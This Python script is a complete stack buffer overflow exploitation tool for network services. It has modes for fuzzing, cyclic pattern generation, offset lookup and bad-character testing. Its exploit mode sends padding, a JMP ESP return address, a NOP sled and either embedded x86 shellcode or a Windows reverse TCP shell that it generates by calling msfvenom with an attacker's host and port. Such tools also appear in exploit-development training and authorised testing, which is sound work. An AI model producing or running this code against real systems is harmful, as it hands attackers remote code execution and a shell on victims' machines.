#!/usr/bin/env python3
from __future__ import annotations

import argparse
import socket
import subprocess
import sys
import time
from dataclasses import dataclass
from typing import Literal

Mode = Literal["fuzz", "pattern", "pattern-offset", "offset-test", "badchars", "exploit", "raw"]
PayloadKind = Literal["calc", "reverse"]

CALC_X86 = (
    b"\xdb\xd7\xbb\x7a\x6b\xad\x11\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x31\x31\x5e\x18\x03\x5e\x18\x83\xee\xfc\xd0"
    b"\x9c\xe3\x14\x96\x5f\x1c\xe4\xf7\xd6\xf9\xd5\x37\x8c\x8a\x45\x88\xc6\xde\x69\x63\x8a\xca\xfa\x01\x03\xfd\x4b\xaf\x75\x30\x4c\x9c\x46\x53\xce\xdf\x9a\xb3\xef\x2f\xef\xb2\x28\x4d\x02\xe6\xe1\x19\xb1\x17\x86\x54\x0a\x93\xd4\x79\x0a\x40\xac\x78\x3b\xd7\xa6\x22\x9b\xd9\x6b\x5f\x92\xc1\x68\x5a\x6c\x7a\x5a\x10\x6f\xaa\x93\xd9\xdc\x93\x1b\x28\x1c\xd3\x9c\xc4\x6b\x2d\xdf\x79\x6c\xea\xa2\xa5\xf9\xe8\x04\x2d\x59\xd5\xb5\xe2\x3c\x9e\xba\x4f\x4a\xf8\xde\x4e\x9f\x72\xda\xdb\x1e\x55\x6a\x9f\x04\x71\x37\x7b\x24\x20\x9d\x2a\x59\x32\x7e\x92\xff\x38\x92\xc7\x8d\x63\xfa\x24\xbc\x9b\xfa\x22\xb7\xe8\xc8\xed\x63\x66\x61\x65\xaa\x71\x86\x5c\x0a\xed\x79\x5f\x6b\x24\xbe\x0b\x3b\x5e\x17\x34\xd0\x9e\x98\xe1\x77\xce\x36\x59\x38\xbe\xf6\x09\xd0\xd4\xf8\x76\xc0\xd6\xd2\x1e\x6b\x2d\xb5\xe0\xc4\xc0\x34\x89\x16\xb3\x38\xc0\xba\x28\xaa\x8f\x24\x6f\xd7\x07\x93\x10\x2c\x17\xd6\x15\x68\x9f\x0a\x64\xe1\x4a\x2d\xdb\x02\x5f\x4e\xba\x90\x03\xbf\x59\x11\xa1\xbf"
)


def parse_hex_escapes(s: str) -> bytes:
    s = s.strip()
    if not s:
        return b""
    if "\\x" in s:
        out = bytearray()
        for part in s.split("\\x"):
            if not part:
                continue
            out.append(int(part[:2], 16))
            if part[2:].strip():
                raise ValueError(f"Invalid bytes: {s!r}")
        return bytes(out)
    return bytes(int(x, 16) for x in s.replace(",", " ").split())

def parse_cli_byte_sequence(s: str) -> bytes:
    s = s.strip()
    if not s:
        return b""
    return s.encode("utf-8").decode("unicode_escape").encode("latin-1", errors="strict")

def create_pattern(length: int) -> bytes:
    cs1 = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    cs2 = b"abcdefghijklmnopqrstuvwxyz"
    cs3 = b"0123456789"
    out = bytearray()
    for a in cs1:
        for b in cs2:
            for c in cs3:
                out.extend((a, b, c))
                if len(out) >= length:
                    return bytes(out[:length])
    return bytes(out[:length])

def parse_query_to_bytes(query: str, raw: bool, word_size: int, endianness: str) -> bytes:
    if raw:
        return parse_cli_byte_sequence(query)
    v = int(query, 0)
    return v.to_bytes(word_size, endianness, signed=False)

def find_offset(length: int, query: str, raw: bool, word_size: int, endianness: str) -> int | None:
    patt = create_pattern(length)
    needle = parse_query_to_bytes(query, raw, word_size, endianness)
    idx = patt.find(needle)
    return idx if idx >= 0 else None

def build_badchar_block(exclude: bytes) -> bytes:
    ex = set(exclude)
    return bytes(b for b in range(1, 256) if b not in ex)

def send_once(ip: str, port: int, timeout: float, prefix: bytes, body: bytes, suffix: bytes, verbose: bool) -> None:
    payload = prefix + body + suffix
    if verbose:
        print(f"[i] sending {len(payload)} bytes to {ip}:{port}", file=sys.stderr)
    with socket.create_connection((ip, port), timeout=timeout) as s:
        s.sendall(payload)

@dataclass(frozen=True)
class Cfg:
    target_ip: str | None
    target_port: int | None
    timeout: float
    prefix: bytes
    suffix: bytes
    mode: Mode
    length: int
    step: int
    offset: int
    query: str | None
    raw_bytes: bytes
    raw: bool
    word_size: int
    endianness: str
    ret: int
    sled: int
    badchars: bytes
    payload: PayloadKind
    lhost: str | None
    lport: int
    reverse_template_file: str | None
    verbose: bool

def parse_args() -> Cfg:
    p = argparse.ArgumentParser(description="Standalone BOF helper (no internal module deps)")
    p.add_argument("--target-ip")
    p.add_argument("--target-port", type=int)
    p.add_argument("--timeout", type=float, default=3.0)
    p.add_argument("--prefix", default="")
    p.add_argument("--suffix", default="")
    p.add_argument("--mode", choices=["fuzz","pattern","pattern-offset","offset-test","badchars","exploit","raw"], required=True)
    p.add_argument("--length", type=int, default=3000)
    p.add_argument("--step", type=int, default=100)
    p.add_argument("--offset", type=int, default=0)
    p.add_argument("--query")
    p.add_argument("--raw-bytes", default="")
    p.add_argument("--raw", action="store_true")
    p.add_argument("--arch", choices=["x86","x64"], default="x86")
    p.add_argument("--word-size", type=int, choices=[4,8])
    p.add_argument("--endianness", choices=["little","big"], default="little")
    p.add_argument("--ret", "--jmp-esp", dest="ret", type=lambda x: int(x,0), default=0)
    p.add_argument("--sled", type=int, default=32)
    p.add_argument("--badchars", default="\\x00\\x0a\\x0d")
    p.add_argument("--payload", choices=["calc","reverse"], default="calc")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument(
        "--reverse-template-file",
        help="Path to raw reverse shellcode bytes to send as-is (optional override)",
    )
    p.add_argument("-v", "--verbose", action="store_true")
    ns = p.parse_args()

    if ns.mode in {"fuzz","pattern","offset-test","badchars","exploit","raw"} and (not ns.target_ip or not ns.target_port):
        p.error("--target-ip and --target-port are required")
    if ns.mode in {"offset-test","badchars","exploit"} and ns.offset <= 0:
        p.error("--offset is required")
    if ns.mode in {"badchars","exploit"} and ns.ret == 0:
        p.error("--ret/--jmp-esp is required")
    if ns.mode == "pattern-offset" and not ns.query:
        p.error("--query is required")
    if ns.mode == "raw" and not ns.raw_bytes:
        p.error("--raw-bytes is required")
    if ns.mode == "exploit" and ns.payload == "reverse":
        if not ns.reverse_template_file and not ns.lhost:
            p.error("--lhost is required for reverse payload unless --reverse-template-file is provided")

    word_size = ns.word_size if ns.word_size else (4 if ns.arch == "x86" else 8)
    return Cfg(
        target_ip=ns.target_ip, target_port=ns.target_port, timeout=ns.timeout,
        prefix=parse_cli_byte_sequence(ns.prefix),
        suffix=parse_cli_byte_sequence(ns.suffix),
        mode=ns.mode, length=ns.length, step=ns.step, offset=ns.offset,
        query=ns.query, raw_bytes=parse_cli_byte_sequence(ns.raw_bytes), raw=ns.raw,
        word_size=word_size, endianness=ns.endianness, ret=ns.ret, sled=ns.sled,
        badchars=parse_hex_escapes(ns.badchars), payload=ns.payload, lhost=ns.lhost, lport=ns.lport,
        reverse_template_file=ns.reverse_template_file, verbose=ns.verbose,
    )

def load_reverse_template(path: str) -> bytes:
    with open(path, "rb") as f:
        return f.read()

def generate_reverse_shellcode_msfvenom(lhost: str, lport: int, badchars: bytes, verbose: bool) -> bytes:
    if not (1 <= lport <= 65535):
        raise ValueError("--lport must be 1..65535")
    try:
        socket.inet_aton(lhost)
    except OSError as exc:
        raise ValueError(f"Invalid --lhost: {lhost}") from exc

    badchars_arg = "".join(f"\\x{b:02x}" for b in badchars)
    cmd = [
        "msfvenom",
        "-p",
        "windows/shell_reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "EXITFUNC=thread",
        "-f",
        "raw",
    ]
    if badchars_arg:
        cmd.extend(["-b", badchars_arg])
    if verbose:
        print(f"[i] msfvenom cmd: {' '.join(cmd)}", file=sys.stderr)
    try:
        proc = subprocess.run(cmd, capture_output=True, check=True)
    except FileNotFoundError as exc:
        raise RuntimeError("msfvenom not found in PATH") from exc
    except subprocess.CalledProcessError as exc:
        stderr = exc.stderr.decode("utf-8", errors="replace").strip()
        raise RuntimeError(f"msfvenom failed: {stderr}") from exc
    shellcode = proc.stdout
    if not shellcode:
        raise RuntimeError("msfvenom returned empty shellcode")
    return shellcode

def main() -> int:
    cfg = parse_args()

    if cfg.mode == "fuzz":
        for n in range(cfg.step, cfg.length + 1, cfg.step):
            send_once(cfg.target_ip, cfg.target_port, cfg.timeout, cfg.prefix, b"A" * n, cfg.suffix, cfg.verbose)
            time.sleep(0.15)
        return 0

    if cfg.mode == "pattern":
        send_once(cfg.target_ip, cfg.target_port, cfg.timeout, cfg.prefix, create_pattern(cfg.length), cfg.suffix, cfg.verbose)
        return 0

    if cfg.mode == "pattern-offset":
        off = find_offset(cfg.length, cfg.query, cfg.raw, cfg.word_size, cfg.endianness)
        print(f"[*] Exact match at offset {off}" if off is not None else "[-] No match found")
        return 0

    if cfg.mode == "offset-test":
        body = b"A" * cfg.offset + cfg.ret.to_bytes(4, "little") + b"CCCC"
        send_once(cfg.target_ip, cfg.target_port, cfg.timeout, cfg.prefix, body, cfg.suffix, cfg.verbose)
        return 0

    if cfg.mode == "badchars":
        body = b"A" * cfg.offset + cfg.ret.to_bytes(4, "little") + build_badchar_block(cfg.badchars)
        send_once(cfg.target_ip, cfg.target_port, cfg.timeout, cfg.prefix, body, cfg.suffix, cfg.verbose)
        return 0

    if cfg.mode == "raw":
        send_once(cfg.target_ip, cfg.target_port, cfg.timeout, cfg.prefix, cfg.raw_bytes, cfg.suffix, cfg.verbose)
        return 0

    if cfg.mode == "exploit":
        if cfg.payload == "calc":
            shellcode = CALC_X86
        else:
            shellcode = (
                load_reverse_template(cfg.reverse_template_file)
                if cfg.reverse_template_file
                else generate_reverse_shellcode_msfvenom(
                    cfg.lhost, cfg.lport, cfg.badchars, cfg.verbose
                )
            )
        body = b"A" * cfg.offset + cfg.ret.to_bytes(4, "little") + (b"\x90" * cfg.sled) + shellcode
        if len(body) > cfg.length:
            raise ValueError(f"Payload too long ({len(body)}) for --length {cfg.length}")
        send_once(cfg.target_ip, cfg.target_port, cfg.timeout, cfg.prefix, body, cfg.suffix, cfg.verbose)
        return 0

    return 1

if __name__ == "__main__":
    raise SystemExit(main())
